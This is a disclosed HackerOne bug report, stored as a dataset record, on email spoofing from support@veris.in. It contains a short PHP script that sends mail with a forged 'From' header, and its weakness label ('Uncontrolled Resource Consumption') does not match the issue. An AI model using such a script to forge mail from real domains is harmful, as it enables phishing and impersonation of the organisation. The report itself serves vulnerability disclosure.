---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '147919'
original_report_id: '147919'
title: "Email spoofing in \tsupport@veris.in"
weakness: Uncontrolled Resource Consumption
team_handle: veris
created_at: '2016-06-28T11:38:46.664Z'
disclosed_at: '2016-07-05T07:31:53.708Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 9
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Email spoofing in 	support@veris.in

## Metadata

- HackerOne Report ID: 147919
- Weakness: Uncontrolled Resource Consumption
- Program: veris
- Disclosed At: 2016-07-05T07:31:53.708Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hey, I've found *email spoofing* vulnerability in support@veris.in 
Issue:
========
When I try to send a fake email from support@veris.in  to my email (mrahsan1337@gmail.com) I was successful in sending a fake email to my **inbox**, this is an issue; because, fake mails should be sent into the 'spam' folder.

### Exploit Code:
```
<?php
$to = "mrahsan1337@gmail.com";
$subject = "test by ahsan";
$txt = "testing";
$headers = "From: support@veris.in";
mail($to,$subject,$txt,$headers);
?>
```
When I tried to run it as a web-app in my browser, like, I created a file in my server (e.g test.php) and in that file I put this exploit code, and saved it when i run it like myserver.com/test.php it showed a blank white page, and next i checked out my email and i received an email from support@veris.in into my **inbox** saying 'testing' 

I hope you'll fix it soon.. :-)

Thanks,
Ahsan Tahir

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
